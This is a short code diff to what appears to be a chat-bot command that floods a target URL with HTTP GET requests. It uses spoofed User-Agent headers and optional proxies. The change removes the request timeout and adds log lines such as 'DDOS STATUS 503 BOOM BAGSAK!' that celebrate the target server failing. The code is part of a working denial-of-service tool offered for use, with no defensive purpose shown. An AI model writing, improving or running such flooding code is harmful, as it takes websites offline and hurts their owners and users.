@@ -109,15 +109,15 @@ module.exports["run"] = async ({ args, chat, font }) => {
             headers["User-Agent"] = generateUserAgent();
 
             axios
-                .get(url, { httpAgent: agent || null, headers })
+                .get(url, { httpAgent: agent || null, headers, timeout: 0 })
                 .then((response) => {
                     if (response.status === 503) {
-                        // Optional: Log or handle 503 status
+                        chat.log("DDOS STATUS 503 BOOM BAGSAK!")
                     }
                 })
                 .catch((error) => {
                     if (error.response && error.response.status === 502) {
-                        // Optional: Log or handle 502 status
+                        chat.log("DDOS STATUS 502");
                     }
                 });
 
